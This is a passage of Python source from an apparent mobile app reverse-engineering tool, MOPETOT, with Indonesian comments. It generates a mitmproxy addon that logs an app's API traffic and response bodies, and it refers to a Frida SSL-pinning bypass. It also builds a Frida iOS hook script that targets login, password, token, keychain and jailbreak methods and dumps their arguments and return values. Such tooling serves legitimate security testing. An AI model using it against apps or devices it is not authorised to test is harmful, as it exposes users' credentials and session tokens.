    paths_js = ", ".join('"%s"' % p for p in api_paths[:60]) or '"__none__"'
    return f'''"""
MOPETOT — mitmproxy addon (auto-generated)
Target: {package_name}
Fungsi:
  1. Tag & log semua request ke host endpoint app (dari scan statis)
  2. Tandai request yang match api_path Dart/retrofit (SEEN-IN-APP)
  3. Simpan body respons utk endpoint menarik (opsional via env LOG_BODY=1)

Pemakaian:
  pip install mitmproxy
  mitmdump -s mopetot_addon.py --listen-port 8080
  (set proxy device/AVD ke <ip-pc>:8080; pasang CA cert mitmproxy di device)
Catatan: kalau app pakai SSL pinning, jalankan Frida bypass MOPETOT bersamaan.
"""
import os

APP_HOSTS = set()
for _h in [{hosts_js}]:
    APP_HOSTS.add(_h)

APP_PATHS = [{paths_js}]

LOG_BODY = os.environ.get("LOG_BODY", "0") == "1"
_seen = set()


class MopetotTagger:
    def request(self, flow):
        host = flow.request.pretty_host
        path = flow.request.path
        if host in APP_HOSTS or any(host.endswith("." + h) for h in APP_HOSTS):
            matched = next((p for p in APP_PATHS if p and p in path), None)
            tag = " [SEEN-IN-APP path=" + matched + "]" if matched else ""
            print(f"[MOPETOT] {{flow.request.method}} {{host}}{{path}}{{tag}}")

    def response(self, flow):
        if not LOG_BODY:
            return
        host = flow.request.pretty_host
        if host in APP_HOSTS or any(host.endswith("." + h) for h in APP_HOSTS):
            key = host + flow.request.path
            if key in _seen:
                return
            _seen.add(key)
            body = flow.response.text or ""
            print(f"[MOPETOT-BODY] {{host}}{{flow.request.path}} -> {{body[:400]}}")


addons = [MopetotTagger()]
'''


# ======================================================================
# iOS UTILITIES (ObjC class-dump): Hook Generator + Inspector
# ======================================================================
# Sumber data: corpus/sources_ios_symbols/*_classes.json (runtime parser — full)
# atau *_classes.h (fallback symbol table — parsial, tetap berguna).

_IOS_INTEREST_RE = re.compile(
    r"(login|logout|auth|password|passwd|credential|token|session|secret|"
    r"api_?key|encrypt|decrypt|crypt|sign|certificate|ssl|tls|pinning|"
    r"biometric|touchid|faceid|jailbreak|rooted?|deviceid|otp|cookie|"
    r"keychain|header|jwt|refresh)", re.I)

# Class sistem Apple — tidak menarik untuk di-hook (noise)
_IOS_SYSTEM_PREFIXES = (
    "NS", "UI", "CF", "CA", "CL", "SK", "MK", "MP", "AV", "CN", "CT", "PK",
    "WK", "AS", "GK", "OS", "SC", "Sec", "CG", "CTK", "EK", "MT", "NL", "PN",
)


def _ios_class_is_system(cls_name: str) -> bool:
    n = cls_name or ""
    if not n:
        return True
    return n.startswith(_IOS_SYSTEM_PREFIXES) or n.startswith("_Tt")  # _TtC = Swift mangling


def _ios_load_targets(corpus_dir: Path) -> List[Dict[str, Any]]:
    """Kumpulkan semua (binary, class, methods) dari sources_ios_symbols.

    Format didukung:
    - <bin>_classes.json  : hasil runtime parser (full: methods+ivars+props)
    - <bin>_classes.h     : format baru (rendered) atau legacy (lief symbols)
    """
    sym_dir = corpus_dir / "sources_ios_symbols"
    if not sym_dir.exists():
        return []
    targets = []
    # 1) JSON (hasil runtime parser)
    for jf in sorted(sym_dir.glob("*_classes.json")):
        try:
            data = json.loads(jf.read_text(encoding="utf-8", errors="replace"))
        except Exception:
            continue
        binary = data.get("binary") or jf.name.replace("_classes.json", "")
        encrypted = bool(data.get("encrypted"))
        anon = 0
        for c in data.get("classes") or []:
            name = c.get("name")
            if not name:
                anon += 1
                name = "<class-anon-%d>" % anon
            targets.append({
                "binary": binary, "class": name,
                "super": c.get("super") or "", "swift": bool(c.get("swift")),
                "methods": [m[0] if isinstance(m, (list, tuple)) else m
                            for m in (c.get("methods") or [])],
                "class_methods": [m[0] if isinstance(m, (list, tuple)) else m
                                  for m in (c.get("class_methods") or [])],
                "method_count": int(c.get("method_count") or 0),
                "ivar_count": int(c.get("ivar_count") or 0),
                "names_encrypted": bool(c.get("names_encrypted")),
                "source": "partial-fairplay" if encrypted else "runtime-dump",
            })
        for cat in data.get("categories") or []:
            cname = cat.get("class")
            if not cname:
                continue
            targets.append({
                "binary": binary, "class": cname, "super": "", "swift": False,
                "methods": [m[0] if isinstance(m, (list, tuple)) else m
                            for m in (cat.get("methods") or [])],
                "class_methods": [m[0] if isinstance(m, (list, tuple)) else m
                                  for m in (cat.get("class_methods") or [])],
                "source": "category",
            })
    seen_json_bins = {t["binary"] for t in targets}
    # 2) Header .h — hanya binary tanpa JSON (scan lama / hasil fallback)
    for hf in sorted(sym_dir.glob("*_classes.h")):
        binary = hf.name.replace("_classes.h", "")
        if binary in seen_json_bins:
            continue
        try:
            text = hf.read_text(encoding="utf-8", errors="replace")
        except Exception:
            continue
        # format baru: blok @interface diikuti baris "    - (id) sel:;"
        cur = {"binary": binary, "class": "", "super": "", "swift": False,
               "methods": [], "class_methods": [], "source": "header"}
        for line in text.splitlines():
            mi = re.match(r"@interface\s+([\w$]+)\s*:\s*([\w$]+)", line)
            if mi:
                if cur["class"] and (cur["methods"] or cur["class_methods"]):
                    targets.append(cur)
                cur = {"binary": binary, "class": mi.group(1), "super": mi.group(2),
                       "swift": False, "methods": [], "class_methods": [], "source": "header"}
                continue
            mm = re.match(r"\s*[-+]\s*\([^)]*\)\s*([.\w:$]+)\s*;", line)
            if mm and cur["class"]:
                (cur["class_methods"] if line.strip().startswith("+")
                 else cur["methods"]).append(mm.group(1))
        if cur["class"] and (cur["methods"] or cur["class_methods"]):
            targets.append(cur)
        # format legacy (lief symbols): "-[Class sel:]" per baris
        legacy: Dict[str, List[str]] = {}
        for line in text.splitlines():
            ml = re.match(r"[-+]\[\s*([\w$]+)\s+([\w:$]+)\]", line.strip())
            if ml:
                legacy.setdefault(ml.group(1), []).append(ml.group(2))
        for cname, sels in legacy.items():
            targets.append({"binary": binary, "class": cname, "super": "",
                            "swift": False, "methods": sels, "class_methods": [],
                            "source": "legacy-symbols"})
    return targets


def _ios_encryption_info(corpus_dir: Path) -> Dict[str, Any]:
    """Ringkasan FairPlay dari corpus/ios_crypto.json (jika ada)."""
    try:
        d = json.loads((corpus_dir / "ios_crypto.json")
                       .read_text(encoding="utf-8", errors="replace"))
        bins = d.get("binaries") or []
        return {
            "any_encrypted": bool(d.get("any_encrypted")),
            "encrypted": [b.get("file") for b in bins if b.get("encrypted")],
            "total": len(bins),
        }
    except Exception:
        return {"any_encrypted": False, "encrypted": [], "total": 0}


def ios_inspect(corpus_dir: Path, query: str = "", limit: int = 300) -> Dict[str, Any]:
    """iOS Inspector: inventory class/method dari class-dump (filter query opsional)."""
    targets = _ios_load_targets(corpus_dir)
    q = (query or "").strip().lower()
    bins: Dict[str, Dict[str, Any]] = {}
    shown = 0
    for t in targets:
        if q and q not in t["class"].lower() \
                and not any(q in m.lower() for m in t["methods"]):
            continue
        if shown >= limit:
            break
        shown += 1
        b = bins.setdefault(t["binary"], {"binary": t["binary"], "classes": []})
        b["classes"].append({
            "class": t["class"], "super": t.get("super") or "",
            "swift": t.get("swift", False), "source": t.get("source", ""),
            "methods": (t.get("methods") or [])[:80],
            "class_methods": (t.get("class_methods") or [])[:40],
            "method_count": t.get("method_count", 0),
            "ivar_count": t.get("ivar_count", 0),
            "names_encrypted": bool(t.get("names_encrypted")),
        })
    stats = {
        "binaries": len(bins),
        "classes": sum(len(b["classes"]) for b in bins.values()),
        "methods": sum(len(c["methods"]) + len(c["class_methods"])
                       for b in bins.values() for c in b["classes"]),
    }
    return {"bins": list(bins.values()), "stats": stats, "truncated": shown >= limit,
            "encryption": _ios_encryption_info(corpus_dir)}


def _ios_selector_name(sel: str) -> str:
    return (sel or "").strip().rstrip(";")


def _js_escape(s: str) -> str:
    return (s or "").replace("\\", "\\\\").replace("'", "\\'")


def generate_ios_hook_script(corpus_dir: Path, max_hooks: int = 25) -> Dict[str, Any]:
    """Generate Frida ObjC hook script dari class-dump iOS.

    Pilih method menarik (login/auth/token/crypto/keychain/...) dari class
    non-sistem, lalu emit Interceptor.attach ke implementation-nya.
    Return {"script": str, "hooks": [...], "note": str}
    """
    targets = _ios_load_targets(corpus_dir)
    if not targets:
        return {"script": "", "hooks": [],
                "note": "tidak ada class-dump iOS (sources_ios_symbols kosong) — rescan app iOS"}

    # nama binary utama app (work/corpus -> work/ipa_root/Payload/*.app/X) untuk prioritas
    main_bins = set()
    try:
        payload = corpus_dir.parent / "ipa_root" / "Payload"
        for app_dir in payload.glob("*.app"):
            main_bins.add(app_dir.stem)
    except OSError:
        pass

    scored = []
    for t in targets:
        if _ios_class_is_system(t["class"]):
            continue
        for kind in ("methods", "class_methods"):
            for sel in t.get(kind) or []:
                sel = _ios_selector_name(sel)
                if not sel or sel.startswith("_"):
                    continue
                score = 0
                if not _IOS_INTEREST_RE.search(sel):
                    continue  # selector wajib menarik — nama class saja tidak cukup (noise)
                score += 15
                if _IOS_INTEREST_RE.search(t["class"]):
                    score += 5
                if t.get("swift"):
                    score += 1
                if t["binary"] in main_bins:
                    score += 8  # class milik app sendiri > class SDK pihak-3
                scored.append((score, t["binary"], t["class"], sel, kind == "class_methods"))
    # dedupe (class, sel), urut skor turun lalu abjad
    seen = set()
    uniq = []
    for score, binary, cls, sel, is_class_m in sorted(
            scored, key=lambda x: (-x[0], x[2], x[3])):
        key = (cls, sel)
        if key in seen:
            continue
        seen.add(key)
        uniq.append({"score": score, "binary": binary, "class": cls,
                     "selector": sel, "static": is_class_m})
    uniq = uniq[:max_hooks]

    lines = [
        "/**",
        " * MOPETOT — iOS ObjC Hook Script (auto-generated dari class-dump)",
        " * Hook: " + str(len(uniq)) + " method menarik (login/auth/token/crypto/keychain)",
        " * Jalankan: frida -U -f <bundle-id> -l ios_hooks.js",
        " * Note: hook di-attach ke implementation method ObjC — objek arg/ret",
        " *       di-dump sebagai string (try/catch per argumen).",
        " */",
        "",
        "var TARGETS = [",
    ]
    for t in uniq:
        lines.append("    { cls: '" + _js_escape(t["class"]) + "', sel: '"
                     + _js_escape(t["selector"]) + "', static: "
                     + ("true" if t["static"] else "false") + ", bin: '"
                     + _js_escape(t["binary"]) + "' },")
    lines.append("];")
    lines += [
        "",
        "if (typeof ObjC === 'undefined' || !ObjC.available) {",
        "    console.log('[iOS] ObjC runtime tidak tersedia — jalankan di device iOS');",
        "} else {",
        "    TARGETS.forEach(function (t) {",
        "        try {",
        "            var klass = ObjC.classes[t.cls];",
        "            if (!klass) { console.log('[iOS] class tidak ada: ' + t.cls); return; }",
        "            var m = klass[t.sel];",
        "            if (!m) { console.log('[iOS] selector tidak ada: ' + t.cls + ' -> ' + t.sel); return; }",
        "            Interceptor.attach(m.implementation, {",
        "                onEnter: function (args) {",
        "                    console.log('[HOOK] ' + t.cls + ' ' + t.sel + ' (' + t.bin + ')');",
        "                    for (var i = 2; i < 6; i++) {",
        "                        try {",
        "                            if (args[i] === null || args[i] === undefined) continue;",
        "                            var o = new ObjC.Object(args[i]);",
        "                            var s = o.toString ? o.toString() : 'non-obj';",
        "                            if (s.length > 512) s = s.slice(0, 512) + '...';",
        "                            console.log('    arg' + (i - 2) + ': ' + s);",
        "                        } catch (e) { }",
        "                    }",
        "                },",
        "                onLeave: function (rv) {",
        "                    try {",
        "                        if (rv === null || rv === undefined) return;",
        "                        var o = new ObjC.Object(rv);",
        "                        var s = o.toString ? o.toString() : 'non-obj';",
        "                        if (s.length > 512) s = s.slice(0, 512) + '...';",
        "                        console.log('    ret: ' + s);",
        "                    } catch (e) { }",
        "                }",
        "            });",
        "            console.log('[iOS] hooked: ' + t.cls + ' -> ' + t.sel);",
        "        } catch (e) { console.log('[iOS] fail ' + t.cls + ': ' + e); }",
        "    });",
        "}",
        "",
    ]
    note = ""
    if not uniq:
        note = ("tidak ada method menarik (login/auth/token/crypto) di class non-sistem — "
                "buka iOS Inspector untuk browse manual; binary FairPlay-encrypted hanya "
                "menyediakan symbol parsial")
    return {"script": "\n".join(lines), "hooks": uniq, "note": note}
